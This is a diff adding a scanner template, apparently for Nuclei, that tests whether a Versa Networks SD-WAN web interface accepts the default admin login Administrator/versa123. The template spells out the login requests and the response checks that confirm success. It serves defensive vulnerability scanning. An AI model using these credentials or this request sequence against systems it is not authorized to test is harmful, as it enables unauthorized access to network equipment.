@@ -1,0 +1,55 @@
+id: versa-default-login
+
+info:
+  name: Versa Networks SD-WAN Application Default Login
+  author: davidmckennirey
+  severity: high
+  description: Versa Networks SD-WAN application default admin credentials were discovered.
+  reference:
+    - https://versa-networks.com/products/sd-wan.php
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+  metadata:
+    max-request: 2
+  tags: default-login,versa,sdwan
+
+http:
+  - raw:
+      - |
+        GET /versa/login.html HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+      - |
+        POST /versa/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username={{user}}&password={{pass}}&sso=systemRadio
+
+    attack: pitchfork
+    payloads:
+      user:
+        - Administrator
+      pass:
+        - versa123
+    cookie-reuse: true
+    req-condition: true
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_2 == 302'
+          - "contains(tolower(header_2), 'jsessionid')"
+          - "contains(tolower(header_2), 'location: /versa/index.html')"
+        condition: and
+
+      - type: dsl
+        dsl:
+          - "contains(tolower(header_2), '/login?error=true')"
+          - "contains(tolower(header_2), '/login?tokenmissingerror=true')"
+        negative: true
+
+# digest: 4b0a00483046022100999377e255e370d3cdce38ead81d80101c8093f98d45e60c5362f0ddfa9dd669022100868530f6c6b834c36963c522f0d16d4f28a949a8af9b49f54c5c0fa574671a4f:922c64590222798bb761d5b6d8e72950
